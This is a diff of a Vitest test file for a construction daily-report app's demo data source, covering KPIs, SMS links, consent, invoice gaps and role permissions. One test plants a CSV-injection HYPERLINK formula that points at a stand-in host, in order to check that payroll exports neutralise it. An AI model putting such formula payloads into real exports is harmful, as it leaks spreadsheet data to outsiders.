@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { emptyReportData } from '@sitelog/shared/schemas/report.ts';
+import { emptyReportDataV1 } from '@sitelog/shared/schemas/report.ts';
 import { DemoStore, demoUserFor } from './store';
 import { DemoSource, demoPayrollCsv } from './DemoSource';
 
@@ -20,9 +20,9 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(o.kpis.reportsIn).toBe(4);
     expect(o.kpis.total).toBe(6);
     expect(o.kpis.segments).toEqual({ filed: 4, weather: 1, missing: 1, awaiting: 0, noWork: 0 });
-    // Riverside 24 + Oakmont 23 + Pier 9 10 + Northgate 11
-    expect(o.kpis.crewOnSite).toBe(68);
-    expect(o.kpis.laborHours).toBe(544);
+    // Riverside 24 + Oakmont 23 + Pier 9 13 + Northgate 14 (§18.1: 14 workers, 100.0 h)
+    expect(o.kpis.crewOnSite).toBe(74);
+    expect(o.kpis.laborHours).toBe(580);
     // Riverside (3.5 h), Pier 9 (2 h), Hillcrest (weather day, 5 h)
     expect(o.kpis.weatherAffectedSites).toBe(3);
     expect(o.kpis.weatherLostHours).toBe(10.5);
@@ -41,7 +41,7 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(o.sitesToday[0]!.projectCode).toBe('ES-0377'); // exceptions first
   });
 
-  it('overview: needs-attention order missing → needs_review → invoice_gap → unknown_sender → glossary_review', async () => {
+  it('overview: needs-attention order missing → needs_review → invoice_gap → unknown_contact → glossary_review', async () => {
     const { source: s } = source();
     const o = await s.getOverview();
     expect(o.needsAttention.map((a) => a.kind)).toEqual([
@@ -49,12 +49,179 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
       'needs_review',
       'invoice_gap',
       'invoice_gap',
-      'unknown_sender',
+      'unknown_contact',
       'glossary_review',
     ]);
-    expect(o.needsAttention[2]!.title).toBe('Invoice gap: BrightLine Electric +16 h');
-    expect(o.needsAttention[3]!.title).toBe('Invoice gap: ClearView Glazing +8 h');
-    expect(o.needsAttention[0]!.actions.map((a) => a.kind)).toEqual(['call', 'mark_no_work']);
+    // The Web-Overview artboard's cards, as copy keys with their values.
+    expect(o.needsAttention[0]!.body).toEqual([
+      { key: 'overview.attention.missing.body', vars: { first: 'Priya', count: 2 } },
+      {
+        key: 'overview.attention.missing.alerted',
+        vars: { time: { time: expect.any(String), tz: 'America/Chicago' } },
+      },
+    ]);
+    // A project manager gets no missing notice (§13 audiences), so no alert line.
+    const pm = await source('pm').source.getOverview();
+    expect(pm.needsAttention[0]!.body).toHaveLength(1);
+    expect(o.needsAttention[1]!.title).toEqual({
+      key: 'overview.attention.needs_review.titleUnknownCompany',
+      vars: { site: 'Oakmont', name: 'Ridgeway' },
+    });
+    expect(o.needsAttention[1]!.body).toEqual([
+      { key: 'overview.attention.needs_review.unknownCompany', vars: { count: 6 } },
+    ]);
+    expect(o.needsAttention[2]!.title).toEqual({
+      key: 'overview.attention.invoice_gap.title',
+      vars: { company: 'BrightLine Electric', invoiced: { hours: 212 } },
+    });
+    expect(o.needsAttention[2]!.body).toEqual([
+      {
+        key: 'overview.attention.invoice_gap.bodyOver',
+        vars: { reported: { hours: 196 }, gap: { hours: 16 } },
+      },
+    ]);
+    expect(o.needsAttention[3]!.title.vars).toMatchObject({ company: 'ClearView Glazing' });
+    expect(o.needsAttention[4]!.title.key).toBe('overview.attention.unknown_contact.titleCall');
+    expect(o.needsAttention[0]!.actions.map((a) => a.kind)).toEqual([
+      'call',
+      'text_link',
+      'mark_no_work',
+    ]);
+  });
+
+  it('overview: the channel of each site (D35), and Elm St.’s two reminders', async () => {
+    const { source: s } = source();
+    const o = await s.getOverview();
+    const byCode = Object.fromEntries(o.sitesToday.map((r) => [r.projectCode, r]));
+    // §18.1: Riverside by the web recorder, Northgate and Hillcrest by call.
+    expect(byCode['RL-2041']).toMatchObject({ channel: 'link', channelReported: true });
+    expect(byCode['NG-2210']).toMatchObject({ channel: 'call', channelReported: true });
+    expect(byCode['HS-0418']).toMatchObject({ channel: 'call', channelReported: true });
+    // Elm St. has no report: Priya's preference.
+    expect(byCode['ES-0377']).toMatchObject({
+      channel: 'link',
+      channelReported: false,
+      remindersSent: 2,
+    });
+    expect(byCode['RL-2041']!.remindersSent).toBe(0);
+  });
+
+  it('overview: a text that did not arrive today needs attention until a later one does (F17)', async () => {
+    const { source: s, store } = source();
+    const priya = store.data.reporters.find((r) => r.name === 'Priya Raman')!;
+    const reminder = store.data.messages.find(
+      (m) => m.reporter_id === priya.id && m.copy_key === 'reminder_2',
+    )!;
+    reminder.status = 'undeliverable';
+    let o = await s.getOverview();
+    const item = o.needsAttention.at(-1)!;
+    expect(item.kind).toBe('undeliverable');
+    expect(item.title).toEqual({
+      key: 'overview.attention.undeliverable.title',
+      vars: { name: 'Priya Raman' },
+    });
+    expect(item.actions.map((a) => a.kind)).toEqual(['call', 'open_team']);
+    // "Text today's link" reaches her afterwards: the item goes.
+    await s.textDailyLink(store.data.sites.find((x) => x.project_code === 'ES-0377')!.id, 'req-1');
+    o = await s.getOverview();
+    expect(o.needsAttention.some((a) => a.kind === 'undeliverable')).toBe(false);
+  });
+
+  it('overview: review reasons, call_mismatch and no_photo included (§10.5, §10.9)', async () => {
+    const { source: s, store } = source();
+    const oakmont = store.data.reports.find((r) => r.needs_review)!;
+    oakmont.review_reasons = ['call_mismatch:manpower[0].workers', 'no_photo', 'unconfirmed'];
+    const o = await s.getOverview();
+    const item = o.needsAttention.find((a) => a.kind === 'needs_review')!;
+    expect(item.title.key).toBe('overview.attention.needs_review.title');
+    expect(item.body).toEqual([
+      {
+        key: 'overview.attention.reasons.call_mismatch',
+        vars: { field: 'manpower[0].workers' },
+      },
+      { key: 'overview.attention.reasons.no_photo' },
+      { key: 'overview.attention.reasons.unconfirmed' },
+    ]);
+  });
+
+  it('texts today’s link once per request, and says why when it cannot (W1-16)', async () => {
+    const { source: s, store } = source('pm');
+    const elm = store.data.sites.find((x) => x.project_code === 'ES-0377')!;
+    const priya = store.data.reporters.find((r) => r.name === 'Priya Raman')!;
+    const before = store.data.messages.length;
+    expect(await s.textDailyLink(elm.id, 'req-a')).toEqual({ sent: true, channel: 'sms' });
+    expect(await s.textDailyLink(elm.id, 'req-a')).toEqual({ sent: true, channel: 'sms' });
+    expect(store.data.messages.length).toBe(before + 1);
+    const text = store.data.messages.at(-1)!;
+    expect(text).toMatchObject({ reporter_id: priya.id, copy_key: 'daily_link', channel: 'sms' });
+    expect(text.body).toMatch(/^Today's report for Elm St\. Townhomes: \S+\/r\/[A-Z0-9]{6}/);
+    expect(store.data.audit.at(-1)).toMatchObject({
+      action: 'daily_link.texted',
+      actor_type: 'user',
+      entity_id: priya.id,
+    });
+    // A second tap texts the same link (the seeded 17:00 one).
+    await s.textDailyLink(elm.id, 'req-b');
+    expect(store.data.messages.at(-1)!.body).toBe(text.body);
+    // Without SMS consent the Notifier sends nothing and says why.
+    const consent = store.data.consents.find(
+      (c) => c.reporter_id === priya.id && c.type === 'sms',
+    )!;
+    consent.revoked_at = '2026-10-09T12:00:00Z';
+    expect(await s.textDailyLink(elm.id, 'req-c')).toEqual({
+      sent: false,
+      reason: 'no_consent',
+      detail: null,
+    });
+    consent.revoked_at = null;
+    await expect(source('accounts', store).source.textDailyLink(elm.id, 'req-d')).rejects.toThrow(
+      'You’re not allowed to do that.',
+    );
+  });
+
+  it('texts the primary among the active reporters, else the first active, as the function (W1-18)', async () => {
+    const { source: s, store } = source('pm');
+    const elm = store.data.sites.find((x) => x.project_code === 'ES-0377')!;
+    const priya = store.data.reporters.find((r) => r.name === 'Priya Raman')!;
+    const other = store.data.reporters.find((r) => r.id !== priya.id && r.status === 'active')!;
+    store.data.siteReporters.push({
+      ...store.data.siteReporters.find((sr) => sr.reporter_id === priya.id)!,
+      reporter_id: other.id,
+      is_primary: false,
+    });
+    for (const c of store.data.consents) if (c.reporter_id === other.id) c.revoked_at = null;
+    if (!store.data.consents.some((c) => c.reporter_id === other.id && c.type === 'sms')) {
+      store.data.consents.push({
+        ...store.data.consents.find((c) => c.reporter_id === priya.id && c.type === 'sms')!,
+        id: 'consent-other',
+        reporter_id: other.id,
+      });
+    }
+    await s.textDailyLink(elm.id, 'req-1');
+    expect(store.data.audit.at(-1)).toMatchObject({
+      action: 'daily_link.texted',
+      entity_id: priya.id,
+    });
+
+    // An inactive primary ('invited' is not active) is passed over for the active one.
+    for (const status of ['invited', 'opted_out', 'disabled'] as const) {
+      priya.status = status;
+      await s.textDailyLink(elm.id, `req-${status}`);
+      expect(store.data.audit.at(-1)).toMatchObject({
+        action: 'daily_link.texted',
+        entity_id: other.id,
+      });
+    }
+
+    // Nobody active → 409 no_active_reporter; nobody linked → 409 no_reporter.
+    other.status = 'invited';
+    await expect(s.textDailyLink(elm.id, 'req-none-active')).rejects.toMatchObject({
+      code: 'no_active_reporter',
+    });
+    store.data.siteReporters = store.data.siteReporters.filter((sr) => sr.site_id !== elm.id);
+    await expect(s.textDailyLink(elm.id, 'req-none')).rejects.toMatchObject({
+      code: 'no_reporter',
+    });
   });
 
   it('hours matrix W41: Apex 472 match · BrightLine 196 (+16) · ClearView 152 (+8) · total 1,804', async () => {
@@ -95,7 +262,12 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(bl.totals).toEqual({ invoiced: 212, reported: 196, gap: 16 });
     expect(bl.days.map((d) => d.gap)).toEqual([0, 4, 4, 4, 4]);
     expect(bl.evidence.length).toBeGreaterThan(0);
-    expect(bl.evidence.some((e) => e.quote.includes('five electricians'))).toBe(true);
+    expect(bl.evidence.some((e) => e.quote?.includes('five electricians'))).toBe(true);
+    // W3-06: every gap day cites its voice-note second (P7 plays it there).
+    const hero = bl.evidence.find((e) => e.reportNo === 'RL-2041-0187')!;
+    expect(hero).toMatchObject({ kind: 'voice_note', at: 19.5 });
+    expect(hero.clipId).toBeTruthy();
+    expect(bl.evidence.every((e) => e.kind === 'voice_note')).toBe(true);
   });
 
   it('weather Oct 2026: 10 site-days, 36.5 h, 7 claim-ready', async () => {
@@ -154,11 +326,38 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(d.excerpts.length).toBeGreaterThanOrEqual(4);
     expect(d.excerpts.some((e) => e.quote.startsWith('Llovió'))).toBe(true);
     expect(d.questions[0]!.answer).toBe('5 · full day');
-    expect(d.activity.map((a) => a.label)).toContain('Question answered');
+    expect(d.activity.map((a) => a.kind)).toContain('question_answered');
+    // Every clip plays (W1-17): the 17:38 voice note and the 20:09 spoken correction (F10).
+    expect(d.clips.map((c) => [c.kind, c.durationS, c.peaks.length > 0])).toEqual([
+      ['voice_note', 168, true],
+      ['voice_note', expect.any(Number), true],
+    ]);
+    expect(d.clips[0]!.excerpts.some((e) => e.quote.startsWith('Llovió'))).toBe(true);
+    expect(d.clips[1]!.transcript?.text).toBe('Apex was 7, not 6.');
+    expect(d.report).toMatchObject({ channel: 'web', confirmedVia: 'web', language: 'en' });
     expect(d.photos).toHaveLength(2);
     expect(d.delayLogHours).toBe(3.5);
     const v1 = await s.getReportDetail(hero.id, 1);
     expect(v1.totals.crewOnSite).toBe(23);
+  });
+
+  it('report detail: a call report plays its recording and logs the calls of the day', async () => {
+    const { source: s, store } = source();
+    const hillcrest = store.data.sites.find((x) => x.name.startsWith('Hillcrest'))!;
+    const report = store.data.reports.find(
+      (r) => r.site_id === hillcrest.id && r.channel === 'voice',
+    )!;
+    const d = await s.getReportDetail(report.id);
+    expect(d.clips).toHaveLength(1);
+    expect(d.clips[0]).toMatchObject({ kind: 'call', bucket: 'calls' });
+    expect(d.clips[0]!.peaks.length).toBeGreaterThan(0);
+    expect(d.audio).toBeNull();
+    const kinds = d.activity.map((a) => a.kind);
+    // §18.1: the 17:45 reminder call is not answered, Aisha calls back at 18:41.
+    expect(kinds).toContain('call_missed');
+    expect(kinds).toContain('call_in');
+    expect(kinds).toContain('text_sent');
+    expect(kinds.indexOf('call_missed')).toBeLessThan(kinds.indexOf('call_in'));
   });
 
   it('reports list: filters, flags and pagination', async () => {
@@ -173,7 +372,18 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(rain.weatherHours).toBe(36.5);
     const edited = await s.listReports({ edited: true });
     expect(edited.items.map((i) => i.reportNo)).toEqual(['RL-2041-0187']);
-    expect(edited.items[0]!.flags.map((f) => f.label)).toEqual(['Rain 3.5 h', 'v2', 'Late 17:38']);
+    expect(edited.items[0]!.flags).toEqual([
+      { kind: 'rain', hours: 3.5 },
+      { kind: 'version', version: 2 },
+      { kind: 'late', time: '17:38' },
+    ]);
+    expect(edited.items[0]!.channel).toBe('link');
+    // P6 Channel filter: Oct 9's two calls (Northgate, Hillcrest) are the only call reports.
+    const calls = await s.listReports({ channel: 'call' });
+    expect(calls.total).toBe(2);
+    expect(calls.items.every((i) => i.channel === 'call')).toBe(true);
+    const links = await s.listReports({ channel: 'link' });
+    expect(links.total).toBe(all.total - 2);
     const review = await s.listReports({ status: 'needs_review' });
     expect(review.items[0]!.flags.some((f) => f.kind === 'unknown_sub')).toBe(true);
     const text = await s.listReports({ q: 'llovió' });
@@ -197,8 +407,9 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(settings.settings.default_deadline).toBe('17:30:00');
     expect(settings.siteRecipients).toHaveLength(6);
     const b = await s.getBilling();
-    expect(b.plan.monthlyCents).toBe(239_400);
-    expect(b.invoices.map((i) => i.amountCents)).toEqual([239_400, 239_400, 199_500, 159_600]);
+    expect(b.plan.monthlyMinor).toBe(239_400);
+    expect(b.plan.price).toEqual({ minor: 39_900, currency: 'USD' });
+    expect(b.invoices.map((i) => i.amountMinor)).toEqual([239_400, 239_400, 199_500, 159_600]);
     expect(await s.getNavBadges()).toEqual({
       reportsToReview: 1,
       unknownSenders: 1,
@@ -208,6 +419,90 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     const results = await s.search('ridgeway');
     expect(results.map((r) => r.kind)).toContain('company');
     expect(results.map((r) => r.kind)).toContain('term');
+  });
+
+  it('links a caller or texter as invited until consent, a WhatsApp sender as active (W1-16)', async () => {
+    const { source: s, store } = source('ops');
+    // §18.1: the unknown contact called (W1-06); a caller is linked from W1-16 on.
+    const luis = store.data.unknownContacts.find((u) => u.status === 'pending')!;
+    expect(luis.channel).toBe('voice');
+    const siteId = luis.guessed_site_id!;
+    await s.linkUnknownSender({ unknownSenderId: luis.id, siteId, name: 'Luis' });
+    expect(luis.status).toBe('linked');
+    const caller = store.data.reporters.find((r) => r.phone_e164 === luis.phone_e164)!;
+    expect(caller).toMatchObject({ status: 'invited', name: 'Luis', activated_at: null });
+    expect(
+      store.data.messages.some((m) => m.reporter_id === caller.id && m.copy_key === 'welcome'),
+    ).toBe(true);
+    expect(store.data.audit.at(-1)).toMatchObject({
+      action: 'unknown_contact.linked',
+      entity_id: luis.id,
+      diff: { channel: 'voice', consent: 'pending' },
+    });
+    await expect(
+      s.linkUnknownSender({ unknownSenderId: luis.id, siteId, name: 'Luis' }),
+    ).rejects.toThrow('This contact was already linked');
+    const texter = {
+      ...luis,
+      id: 'unknown:texter',
+      phone_e164: '+15550100111',
+      channel: 'sms' as const,
+      call_id: null,
+      status: 'pending' as const,
+    };
+    store.data.unknownContacts.push(texter);
+    await s.linkUnknownSender({ unknownSenderId: texter.id, siteId, name: 'Texter' });
+    expect(store.data.reporters.find((r) => r.phone_e164 === texter.phone_e164)!.status).toBe(
+      'invited',
+    );
+    // A number whose reporter opted out stays out (only START brings it back).
+    const stopped = {
+      ...texter,
+      id: 'unknown:stopped',
+      phone_e164: store.data.reporters[0]!.phone_e164,
+      status: 'pending' as const,
+    };
+    store.data.reporters[0]!.status = 'opted_out';
+    store.data.unknownContacts.push(stopped);
+    await expect(
+      s.linkUnknownSender({ unknownSenderId: stopped.id, siteId, name: 'X' }),
+    ).rejects.toThrow('You’re not allowed to do that.');
+    // A WhatsApp sender (no channel) is linked active, as before.
+    const sender = {
+      ...texter,
+      id: 'unknown:wa',
+      phone_e164: '+15550100222',
+      channel: null,
+      status: 'pending' as const,
+    };
+    store.data.unknownContacts.push(sender);
+    await s.linkUnknownSender({ unknownSenderId: sender.id, siteId, name: 'Luis' });
+    expect(sender.status).toBe('linked');
+    const reporter = store.data.reporters.find((r) => r.phone_e164 === sender.phone_e164)!;
+    expect(reporter).toMatchObject({ status: 'active', name: 'Luis' });
+    expect(reporter.activated_at).not.toBeNull();
+  });
+
+  it('shows each role the notifications §13 addresses to it, as RLS does on Supabase', async () => {
+    const titles = async (as: 'admin' | 'pm' | 'ops' | 'accounts') =>
+      (await source(as).source.getNotifications()).map((n) => n.kind).sort();
+    expect(await titles('admin')).toEqual([
+      'glossary_review',
+      'invoice_gap',
+      'missing_report',
+      'needs_review',
+      'unknown_contact',
+    ]);
+    expect(await titles('pm')).toEqual(['glossary_review', 'needs_review', 'pack_ready']);
+    expect(await titles('ops')).toEqual([
+      'glossary_review',
+      'invoice_gap',
+      'missing_report',
+      'needs_review',
+      'unknown_contact',
+    ]);
+    expect(await titles('accounts')).toEqual(['invoice_gap']);
+    expect((await source('accounts').source.getNavBadges()).unreadNotifications).toBe(1);
   });
 
   it('mutations persist in memory: sign off, undo, no work, resolve company, simulate report', async () => {
@@ -249,7 +544,7 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     const typed = store.createOfficeReport({
       siteId: elm.id,
       date: '2026-10-09',
-      data: { ...emptyReportData('2026-10-09'), summary: 'Typed in the office.' },
+      data: { ...emptyReportDataV1('2026-10-09'), summary: 'Typed in the office.' },
       userId: demoUserFor('admin').id,
     });
     expect(store.data.versions.find((v) => v.report_id === typed.reportId)!.pdf_path).toBeNull();
@@ -283,9 +578,16 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     const { source: s, store } = source();
     const filed = store.data.reports.filter((r) => r.status === 'filed').slice(0, 3);
     const picked = await s.getPdfUrls({ reportIds: filed.map((r) => r.id) });
+    const dateOf = new Map(store.data.siteDays.map((d) => [d.id, d.date]));
     expect(picked).toEqual({
       files: [],
-      missing: filed.map((r) => ({ reportId: r.id, reportNo: r.report_no })),
+      // The report date and current version name the file (§12, D33).
+      missing: filed.map((r) => ({
+        reportId: r.id,
+        reportNo: r.report_no,
+        date: dateOf.get(r.site_day_id),
+        version: r.current_version,
+      })),
       total: 3,
       capped: false,
     });
@@ -325,7 +627,7 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(picked.files.map((f) => f.reportNo)).toEqual([r.report_no]);
     const detail = await s.getReportDetail(r.id);
     expect(detail.activity).toContainEqual(
-      expect.objectContaining({ label: 'PDF created', detail: `v${r.current_version}` }),
+      expect.objectContaining({ kind: 'pdf_rendered', params: { version: r.current_version } }),
     );
   });
 
@@ -383,6 +685,15 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
   });
 });
 
+describe('DemoSource.getOrgs', () => {
+  it('gives the org’s locale and country pack (the setup wizard locks the country)', async () => {
+    const { source: s } = source();
+    expect(await s.getOrgs()).toEqual([
+      expect.objectContaining({ name: 'Kestrel Build Group', locale: 'en-US', country: 'US' }),
+    ]);
+  });
+});
+
 describe('DemoSource.updateOrg (setup wizard company step in an existing org)', () => {
   it('edits the one org, audits only the changed fields and refuses a blank name', async () => {
     const { source: s, store } = source();
@@ -429,5 +740,114 @@ describe('DemoSource.updateOrg (setup wizard company step in an existing org)', 
         timezone: 'America/Chicago',
       }),
     ).resolves.toMatchObject({ inviteError: null, recipientsError: null });
+  });
+});
+
+describe('Crew hours on v1.2 (W3-06)', () => {
+  const week = ['2026-10-05', '2026-10-06', '2026-10-07', '2026-10-08', '2026-10-09'];
+  // A second Apex invoice for the week (the newer one is compared): Friday +8 h is the day
+  // Northgate's report came in by call (§18.1: Kevin called at 17:10, Apex 3 × 8 h).
+  const apexInvoice = (store: DemoStore, fri: number) => ({
+    companyId: store.data.companies.find((c) => c.name === 'Apex Concrete')!.id,
+    invoiceNo: 'AP-1098',
+    periodStart: week[0]!,
+    periodEnd: week[4]!,
+    lines: week.map((date, i) => ({ date, hours: [88, 96, 96, 88, fri][i]! })),
+  });
+
+  it('cites Northgate’s call second for a gap on the day Kevin called in', async () => {
+    const { source: s, store } = source('ops');
+    await s.addInvoice(apexInvoice(store, 112));
+    const h = await s.getHours('2026-W41');
+    const inv = h.invoices.find((i) => i.invoiceNo === 'AP-1098')!;
+    expect(inv.totals.gap).toBe(8);
+    const call = inv.evidence.find((e) => e.kind === 'call')!;
+    expect(call.reportNo).toMatch(/^NG-2210-/);
+    expect(call.date).toBe('2026-10-09');
+    expect(call.clipId).toBe(store.data.calls.find((c) => c.report_id === call.reportId)!.id);
+    expect(call.at).toBe(10);
+    // The reporter's words at that second of the call's transcript (W3-05 seeds it).
+    expect(call.quote).toBe(
+      'Apex, 3 guys, 8 hours, Ramp B. Shear wall formwork at Level 3, all done.',
+    );
+    expect(call.crew).toEqual({
+      company: 'Apex Concrete',
+      lines: [{ workers: 3, hoursEach: 8 }],
+      total: 24,
+    });
+  });
+
+  it('posts one invoice_gap notice per invoice and gap, to ops and accounts', async () => {
+    const store = new DemoStore();
+    const ops = source('ops', store).source;
+    const before = store.data.notifications.filter((n) => n.kind === 'invoice_gap').length;
+    await ops.addInvoice(apexInvoice(store, 112));
+    const notices = store.data.notifications.filter((n) => n.kind === 'invoice_gap');
+    expect(notices).toHaveLength(before + 1);
+    expect(notices[0]).toMatchObject({
+      user_id: null,
+      title: 'Invoice gap: Apex Concrete +8 h',
+      body: 'AP-1098 invoices 480 h · reports show 472 h',
+      target_path: '/hours?week=2026-W41',
+      data: {
+        key: 'invoice_gap',
+        params: {
+          company: 'Apex Concrete',
+          invoiceNo: 'AP-1098',
+          invoiced: 480,
+          reported: 472,
+          gap: 8,
+        },
+      },
+    });
+    expect(store.data.audit.at(-1)).toMatchObject({
+      action: 'invoice.gap_notified',
+      diff: { gap: 8, previous: null, cause: 'invoice_added' },
+    });
+    // Accounts sees it (§13); pm does not.
+    const accounts = await source('accounts', store).source.getNotifications();
+    expect(accounts.some((n) => n.title === 'Invoice gap: Apex Concrete +8 h')).toBe(true);
+    const pm = await source('pm', store).source.getNotifications();
+    expect(pm.some((n) => n.kind === 'invoice_gap')).toBe(false);
+    // A match posts nothing; the seeded BrightLine gap is not posted again.
+    await ops.addInvoice({ ...apexInvoice(store, 104), invoiceNo: 'AP-1099' });
+    expect(store.data.notifications.filter((n) => n.kind === 'invoice_gap')).toHaveLength(
+      before + 1,
+    );
+  });
+
+  it('stores an invoice file under a safe key in the org folder', async () => {
+    const store = new DemoStore();
+    await source('accounts', store).source.addInvoice({
+      ...apexInvoice(store, 104),
+      file: new File(['%PDF'], 'Rechnung_März [Oct] #4.pdf', { type: 'application/pdf' }),
+    });
+    const inv = store.data.invoices.find((i) => i.invoice_no === 'AP-1098')!;
+    expect(inv.file_path).toMatch(
+      new RegExp(`^${store.data.org.id}/[^/]+-Rechnung_Marz_Oct_4\\.pdf$`),
+    );
+  });
+
+  it('neutralises spreadsheet formulas in the demo payroll CSV', () => {
+    const store = new DemoStore();
+    store.data.companies.find((c) => c.name === 'BrightLine Electric')!.name =
+      '=HYPERLINK("https://x.example/?"&A2,"Pay")';
+    const csv = demoPayrollCsv(store, '2026-W41');
+    expect(csv).toContain(`"'=HYPERLINK(""https://x.example/?""&A2,""Pay"")"`);
+    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m);
+  });
+});
+
+describe('Pause and Resume (W4-10: admin only everywhere)', () => {
+  it('refuses a pm and an ops user, as RLS sites_admin_update does on Supabase', async () => {
+    for (const role of ['pm', 'ops'] as const) {
+      const store = new DemoStore();
+      const u = demoUserFor(role);
+      const s = new DemoSource(store, { id: u.id, email: u.email, name: u.name, role: u.role });
+      const site = store.data.sites[0]!;
+      await expect(s.pauseSite(site.id), role).rejects.toThrow('You’re not allowed to do that.');
+      await expect(s.resumeSite(site.id), role).rejects.toThrow('You’re not allowed to do that.');
+      expect(site.status).toBe('active');
+    }
   });
 });
